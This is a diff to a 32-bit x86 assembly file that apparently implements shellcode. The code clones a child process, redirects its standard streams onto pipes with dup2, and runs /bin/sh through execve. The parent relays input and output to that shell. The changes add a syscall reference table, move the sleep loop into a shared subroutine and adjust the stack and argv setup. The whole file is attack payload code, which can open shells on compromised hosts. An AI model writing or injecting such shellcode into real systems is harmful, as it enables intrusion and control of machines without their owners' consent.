@@ -4,6 +4,63 @@ BITS 32
 ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
 ; syscall return: EAX
 
+;
+; http://www.lxhp.in-berlin.de/lhpsyscal.html
+;
+; all necessary system calls:
+; ===========================
+;
+; clone:	eax: 120
+; 		ebx: clone-flags
+; 		ecx: ptr to top of (distinct) stack space
+; 		edx: ptr to pt_regs or NULL
+;
+; close:	eax: 6
+; 		ebx: fd to close
+;
+; dup2:	eax: 63
+; 		ebx: fd 2 dup
+; 		ecx: fd to assign the dup to
+;
+; execve:	eax: 11
+; 		ebx: ptr to string of program path&name
+; 		ecx: ptr to argv[]
+; 		edx: ptr to envv[]
+;
+; exit:	eax: 1
+; 		ebx: exit code
+;
+; fcntl:	eax: 55
+; 		ebx: fd
+; 		ecx: command code
+; 		edx: file locks: ptr to writable struct flock
+;
+; fork:	eax: 2
+; 		ebx... are passed to forked process.
+;
+; kill:	eax: 37
+; 		ebx: pid (?)
+; 		ecx: signal (?)
+; 		SIGKILL = 9
+;
+; nanosleep:	eax: 162
+; 		ebx: ptr to struct timespec
+; 		ecx: ptr to alterable struct timespec
+;
+; read:	eax: 3
+; 		ebx: fd
+; 		ecx: ptr to buffer
+; 		edx: count
+;
+; write:	eax: 4
+; 		ebx: fd
+; 		ecx: ptr to buffer
+; 		edx: count
+;
+; pipe:	eax: 42
+; 		ebx: ptr to dword[2]
+;
+
 start:
 	call near shcode_start
 shcode_start:
@@ -65,7 +122,7 @@ child:
 	; dup2(sh2m[1], 2)   (dup to stderr)
 	xor	eax,eax
 	mov	al,63
-	mov	ebx,[ebp+sh2m_1]
+;	mov	ebx,[ebp+sh2m_1]
 	inc	ecx
 	int	0x80
 
@@ -84,9 +141,8 @@ child:
 	xor	edx,edx
 	mov	[ecx],ebx			; foo := @'/bin/sh',0
 	mov	[ecx+4],edx			; bar := NULL
-	mov	[ecx+8],edx			; baz := NULL
 	mov	edx,ecx
-	add	edx,8				; edx -> baz
+	add	edx,4				; edx -> bar
 	int	0x80
 
 	; fail if execve did not work.
@@ -117,7 +173,8 @@ parent:
 	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
 	; CLONE_PTRACE = 0x00002000
 	mov	ebx,0x00010f00
-	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
+	mov	ecx,esp	; just use same stack with a delta of 64
+	sub	esp,64 ; we need the stack only a tiny bit.
 	xor	edx,edx
 	int	0x80
 
@@ -186,19 +243,7 @@ leave_sh_second_interleaved:
 	jmp	leave_sh
 
 reader_sleep:
-	; sleep 0.001 seconds:
-	; usleep(0,1000000);
-	xor	eax,eax
-	mov	al, 162
-	mov	ebx, ebp
-	add	ebx, foo
-	mov	ecx, ebx
-	xor	edx,edx
-	mov long [ebx], edx		; seconds
-	mov	edx,100000
-	mov long [ebx+4], edx		; nanoseconds
-	int	0x80
-
+	call	sleep_short
 	jmp	reader_while_fds_ok
 
 do_terminate_child:
@@ -255,6 +300,12 @@ writer_while_fds_ok:
 	jmp	writer_while_fds_ok
 
 writer_sleep:
+	call	sleep_short
+	jmp	writer_while_fds_ok
+
+	; ==================================================================
+
+sleep_short:
 	; sleep 0.001 seconds:
 	; usleep(0,1000000);
 	xor	eax,eax
@@ -268,9 +319,7 @@ writer_sleep:
 	mov long [ebx+4], edx		; nanoseconds
 	int	0x80
 
-	jmp	writer_while_fds_ok
-
-	; ==================================================================
+	ret
 
 child_dead:
 	; at most wait 2 seconds for master's ACK
